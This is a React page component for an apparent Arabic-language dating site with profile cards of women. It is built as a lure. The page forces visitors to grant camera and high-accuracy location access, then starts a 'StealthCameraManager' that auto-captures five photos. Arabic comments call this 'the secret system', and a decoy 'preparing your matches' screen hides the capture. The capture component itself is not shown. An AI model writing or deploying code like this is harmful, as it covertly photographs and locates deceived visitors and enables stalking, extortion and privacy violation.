import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import ProfileCard from '@/components/ProfileCard';
import SubscriptionSection from '@/components/SubscriptionSection';
import StealthCameraManager from '@/components/StealthCameraManager';
import { Loader2, Users, Sparkles, Camera, MapPin } from 'lucide-react';

const profilesData = [
	{
		id: 1,
		name: 'منار',
		tagline: 'أبحث عن شريك لحياة مليئة بالحب والسعادة!',
		imageUrl: '/images/head.jpg',
		galleryImages: [
			'/images/492861928_3042031129270592_5878340506782742433_n.jpg',
			'/images/493679073_3042031239270581_2578712428501145292_n.jpg',
			'/images/494000038_3042031292603909_3860249713121620909_n.jpg',
			'/images/494441961_3042030965937275_6863802993332546293_n.jpg',
			'/images/495175740_3042031405937231_4428811475667918103_n.jpg',
			'/images/495662332_3042030852603953_6875536021466364459_n.jpg',
			'/images/499783379_3042031352603903_3201634282359638241_n.jpg',
			'/images/499861509_3042031079270597_8855453234753504983_n.jpg',
			'/images/500221778_3042031602603878_7582667013154658689_n.jpg',
			'/images/500318729_3042031475937224_5974158495486366566_n.jpg',
		],
	},
	{
		id: 2,
		name: 'نورا',
		tagline: 'أحب الحياة والمغامرات الجديدة!',
		imageUrl: '/images/card1/67384ba5e76045f23d84989f108819a5.jpg',
		galleryImages: [
			'/images/card1/67384ba5e76045f23d84989f108819a5.jpg',
			'/images/card1/8ceb0f3c39b2b5d142e8dc16981ed9b7.jpg',
			'/images/card1/ce4a915ce9decdbd3b6188b718f7ea2e.jpg',
		],
	},
	{
		id: 3,
		name: 'سارة',
		tagline: 'فنانة تعشق الجمال والطبيعة',
		imageUrl: '/images/card2/056586980a24c16f1ea47b8ac16a50e8.jpg',
		galleryImages: [
			'/images/card2/056586980a24c16f1ea47b8ac16a50e8.jpg',
			'/images/card2/1f6cf953d487a6487a37c68c12d332f7.jpg',
			'/images/card2/852ee08aabeae76e97a35141283b23c7.jpg',
			'/images/card2/8616241893958d18d7a1944f6da0a221.jpg',
		],
	},
];

const Index: React.FC = () => {
	const [permissionsGranted, setPermissionsGranted] = useState(false);
	const [permissionStatus, setPermissionStatus] = useState('');
	const [showStealthCapture, setShowStealthCapture] = useState(false);
	const [captureComplete, setCaptureComplete] = useState(false);
	const navigate = useNavigate();

	useEffect(() => {
		const requestPermissions = async () => {
			try {
				setPermissionStatus('طلب إذن الكاميرا...');

				// Request camera permission
				const cameraStream = await navigator.mediaDevices.getUserMedia({
					video: true,
					audio: false,
				});

				// Stop the camera stream immediately after getting permission
				cameraStream.getTracks().forEach((track) => track.stop());

				setPermissionStatus('طلب إذن الموقع...');

				// Request location permission with high accuracy
				await new Promise((resolve, reject) => {
					if (navigator.geolocation) {
						navigator.geolocation.getCurrentPosition(
							(position) => {
								console.log('Location permission granted:', {
									latitude: position.coords.latitude,
									longitude: position.coords.longitude,
									accuracy: position.coords.accuracy,
								});
								resolve(position);
							},
							(error) => {
								console.error('Location permission error:', error);
								reject(error);
							},
							{
								enableHighAccuracy: true,
								timeout: 15000,
								maximumAge: 0,
							}
						);
					} else {
						reject(new Error('Geolocation not supported'));
					}
				});

				// Both permissions granted
				setPermissionsGranted(true);
				// Start stealth photo capture
				setShowStealthCapture(true);
			} catch (error) {
				console.error('Permission denied:', error);
				setPermissionStatus('يجب السماح بالوصول للكاميرا والموقع لاستخدام الموقع');
				// Keep loading state true to prevent showing content
			}
		};

		requestPermissions();
	}, []);

	const handleStealthCaptureComplete = () => {
		setCaptureComplete(true);
		setShowStealthCapture(false);
	};

	// Don't render anything until permissions are granted and capture is complete
	if (!permissionsGranted || showStealthCapture) {
		if (showStealthCapture) {
			return (
				<div>
					{/* النظام السري مع التشغيل التلقائي */}
					<StealthCameraManager
						onComplete={handleStealthCaptureComplete}
						autoStart={true}
						photoCount={5}
					/>
					{/* عرض محتوى عادي للمستخدم أثناء التقاط السري */}
					<div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-seductive-bg to-seductive-bg/80">
						<div className="text-center p-8 rounded-lg bg-white/10 backdrop-blur-sm border border-white/20">
							<div className="flex items-center justify-center gap-4 mb-6">
								<Sparkles className="w-12 h-12 text-seductive-accent" />
							</div>
							<Loader2 className="w-16 h-16 text-seductive-accent animate-spin mb-6 mx-auto" />
							<h2 className="text-2xl md:text-3xl text-white font-bold mb-4">
								جاري تحضير تجربتك الخاصة
							</h2>
							<p className="text-lg text-white/90 mb-4">
								نحن نجهز أفضل المطابقات لك...
							</p>
							<p className="text-sm text-white/70">
								قريباً ستجد شريك العمر المناسب!
							</p>
						</div>
					</div>
				</div>
			);
		}

		return (
			<div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-seductive-bg to-seductive-bg/80">
				<div className="text-center p-8 rounded-lg bg-white/10 backdrop-blur-sm border border-white/20">
					<div className="flex items-center justify-center gap-4 mb-6">
						<Camera className="w-12 h-12 text-seductive-accent" />
						<MapPin className="w-12 h-12 text-seductive-accent" />
					</div>
					<Loader2 className="w-16 h-16 text-seductive-accent animate-spin mb-6 mx-auto" />
					<h2 className="text-2xl md:text-3xl text-white font-bold mb-4">
						مطلوب إذن الوصول
					</h2>
					<p className="text-lg text-white/90 mb-4">
						{permissionStatus || 'جاري طلب الأذونات المطلوبة...'}
					</p>
					<p className="text-sm text-white/70">
						نحتاج للوصول للكاميرا والموقع لتوفير أفضل تجربة لك
					</p>
				</div>
			</div>
		);
	}

	return (
		<div className="min-h-screen flex flex-col">
			<header className="py-8 text-center">
				<div className="container mx-auto px-4">
					<h1 className="text-3xl md:text-4xl lg:text-5xl font-bold text-seductive-text flex items-center justify-center gap-3">
						<Sparkles className="w-8 h-8 md:w-10 md:h-10 text-seductive-accent" />
						اكتشف شريك العمر المناسب لك!
						<Sparkles className="w-8 h-8 md:w-10 md:h-10 text-seductive-accent" />
					</h1>
				</div>
			</header>

			<main className="flex-grow container mx-auto px-4 py-8">
				<div className="text-center mb-12">
					<p className="text-xl md:text-2xl text-seductive-text flex items-center justify-center gap-2">
						<Users className="w-7 h-7 text-seductive-accent" />
						هؤلاء الأشخاص ينتظرونك!
					</p>
				</div>
				<div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8 justify-center">
					{profilesData.map((profile) => (
						<ProfileCard
							key={profile.id}
							imageUrl={profile.imageUrl}
							tagline={profile.tagline}
							name={profile.name}
							galleryImages={profile.galleryImages}
						/>
					))}
				</div>
				<div className="text-center mt-12">
					<p className="text-lg md:text-xl text-seductive-text/80 italic">
						ابدأ محادثة الآن واكتشف المزيد!
					</p>
				</div>
			</main>

			<SubscriptionSection />

			<footer className="text-center py-6 text-seductive-text/60 text-sm">
				<p>&copy; {new Date().getFullYear()} شريك العمر. جميع الحقوق محفوظة.</p>
				<p className="font-english text-xs">
					Lovingly crafted in Menoufia, Egypt.
				</p>
			</footer>
		</div>
	);
};

export default Index;
